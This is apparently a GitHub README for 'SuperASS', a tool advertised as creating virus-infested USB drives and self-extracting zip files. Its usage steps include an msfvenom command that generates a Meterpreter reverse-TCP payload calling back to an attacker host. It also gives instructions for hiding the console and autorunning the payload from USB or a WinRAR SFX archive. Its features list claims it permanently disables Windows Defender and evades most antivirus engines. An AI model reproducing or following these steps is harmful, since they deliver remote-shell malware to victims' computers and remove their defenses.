
<h1 align="center">SuperASS v1.0</h1>
<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0-green?style=for-the-badge">
  <br>
  <br>
  <img src="https://img.shields.io/badge/Author-AbdulazizDXT-green?style=flat-square">
  <img src="https://img.shields.io/badge/Made%20in-Oman-green?style=flat-square">
  <img src="https://img.shields.io/badge/Powerd%20BY-Python-Metasploit-blue?style=flat-square">
</p>

### [√] Description :

***The best tool to create a USB gadget or a zip file infested with a virus with a quick kill protection with Metasploit!***

### [+] Installation

##### The SuperASS project is set up first in Kali Linux, and then the virus boot is set up in Windows :

* You can set up the project initially in Termux, but the remaining steps in preparing a zip file or creating a boot disk require Windows.

 - For KALI Linux :
    - ```git clone https://github.com/AbdulazizDXT/SuperASS```
    - ```cd SuperASS```
    - ```chmod +x install.sh```
    - ```./install.sh```

#### Or, directly run "Root Users {sudo su}"
```
git clone https://github.com/AbdulazizDXT/SuperASS ;cd SuperASS ;chmod +x install.sh ;./install.sh

```
## [+] Usage

1. Run the script
2. SuperASS file window will open automatically after installation
3. Open Terminal and Type "msfvenom -p python/meterpreter/reverse_tcp LHOST={YourIPAddres} LPORT={Your Port} -o Update.py
4. ReName file --> "Update.py" to "Update.pyw" For hide python console
5. Copy the Update.pyw file to the Open SuperASS window and click Replace
6. Now the file must be transferred to the Windows system to start creating an exe file for the virus in the USB or zip files


## [+] Use SuperASS In USB AutoRun :

1. Download USB AutoRun Creator From : https://www.samlogic.net/demos/files/USBAC-DEMO-ENG-SETUP.exe
2. Install & Open after Installation 
3. Now the previously modified SuperASS file should be present in your Windows system
4. After you run the autorun program, choose the file MIN (1).exe & Then choose the USB disk & click create
5. Now copy all the contents of the SuperASS file to the USB and then remove it, but beware not to put it again on your device, it may kill the protection completely and make it difficult to restore it, except by upgrading to the new versions of Windows such as the Insider version

### [+]  Use SuperASS In Zip File AutoRun :

1. Download WinRAR From : https://www.win-rar.com/download.html?&L=0
2. Install & Check [√]
3. Go to the SuperASS file and then right click and click on Add to archive &  Click OK to start pressing... 
4. After compressing the file, open it, then choose the "SFX" option, then "Advanced SFX Option" & Setup Option
5. Type MIN (1).exe & Press OK & OK to Exit
6. Now you can use zip file for hacking / Do not try on your device

### Features:

 - Under 10s to install payload in target device
 - connect Metasploit to hacking
 - Python Quiet install
 - autorun payload in startup windows
 - kill windows defender forever
 - {5 security vendors and no sandboxes flagged this file as malicious} in ViursTotal <57/5>
 - This is the antivirus that detected the virus {Antiy-AVL, GData, Microsoft, ClamAV ,Ikarus}
 - Soon a copy will be released that disables all antivirus programs!
